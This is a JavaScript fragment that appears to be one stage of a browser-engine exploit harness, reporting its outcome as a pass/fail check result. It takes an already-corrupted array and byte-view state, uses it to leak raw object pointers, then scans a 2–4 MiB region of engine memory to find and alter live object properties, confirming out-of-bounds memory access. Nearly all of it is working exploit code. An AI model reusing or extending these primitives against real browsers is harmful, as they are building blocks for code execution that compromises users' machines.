// Seek exact live int32 property signatures in the reachable 2–4 MiB region.
var state = window.__fw14ArrayState;
var phase = "preflight";
var result;
try {
  if (!state || !state.view || !state.array || !state.a ||
      state.array.length !== 8192 || state.array[0] !== state.a ||
      !Number.isInteger(state.index) || state.index < 0)
    throw new Error("held_array_preflight_failed");
  var view = state.view;
  var slot = state.index;
  var c = { marker: 0x11223344 };
  var d = { marker: 0x21324354 };
  state.c = c;
  state.d = d;
  function leak(value) {
    var word = "0x";
    try {
      state.array[0] = value;
      for (var i = 7; i >= 0; i--)
        word += view[slot + i].toString(16).padStart(2, "0");
    } finally {
      state.array[0] = state.a;
    }
    return word;
  }
  function matches(index, value) {
    return view[index] === (value & 255) &&
      view[index + 1] === (value >>> 8 & 255) &&
      view[index + 2] === (value >>> 16 & 255) &&
      view[index + 3] === (value >>> 24 & 255);
  }
  function compare(object, oldValue, newValue, label) {
    var candidates = [];
    var candidateCount = 0;
    var start = 2097152;
    var end = 4194304;
    if (api && typeof api.markSync === "function")
      api.markSync(label + "_before_scan");
    for (var i = start; i + 3 < end; i++) {
      if (matches(i, oldValue)) {
        candidateCount++;
        if (candidates.length < 32) candidates.push(i);
      }
    }
    if (api && typeof api.markSync === "function")
      api.markSync(label + "_candidates_found");
    var changed = [];
    var restored = false;
    try {
      object.marker = newValue;
      for (var j = 0; j < candidates.length; j++)
        if (matches(candidates[j], newValue)) changed.push(candidates[j]);
    } finally {
      object.marker = oldValue;
      restored = object.marker === oldValue;
      for (var r = 0; r < changed.length; r++)
        if (!matches(changed[r], oldValue)) restored = false;
    }
    if (api && typeof api.markSync === "function")
      api.markSync(label + "_restored");
    return { candidates: candidateCount, capped: candidateCount > 32,
      changed: changed, restored: restored };
  }
  phase = "compare_c";
  var cWord = leak(c);
  var cResult = compare(c, 0x11223344, 0x55667788, "signature_c");
  phase = "compare_d";
  var dWord = leak(d);
  var dResult = compare(d, 0x21324354, 0x65768798, "signature_d");
  var cPointer = Number(cWord);
  var dPointer = Number(dWord);
  var deltaMatch = cResult.changed.length === 1 &&
      dResult.changed.length === 1 &&
      Number.isSafeInteger(cPointer) && Number.isSafeInteger(dPointer) &&
      dPointer - cPointer === dResult.changed[0] - cResult.changed[0];
  var arrayRestored = state.array[0] === state.a;
  result = { id: "object_signature", status:
      deltaMatch && cResult.restored && dResult.restored &&
      arrayRestored && !cResult.capped && !dResult.capped ? "pass" : "fail",
    details: {
      c_word: cWord, d_word: dWord,
      c_candidates: cResult.candidates, d_candidates: dResult.candidates,
      c_changed: cResult.changed.join(","),
      d_changed: dResult.changed.join(","),
      c_restored: cResult.restored, d_restored: dResult.restored,
      c_capped: cResult.capped, d_capped: dResult.capped,
      delta_match: deltaMatch, array_restored: arrayRestored
    } };
} catch (error) {
  if (state && state.array && state.a) state.array[0] = state.a;
  result = { id: "object_signature", status: "error", details: {
    phase: phase, error: String(error).slice(0, 200)
  } };
}
return [result];
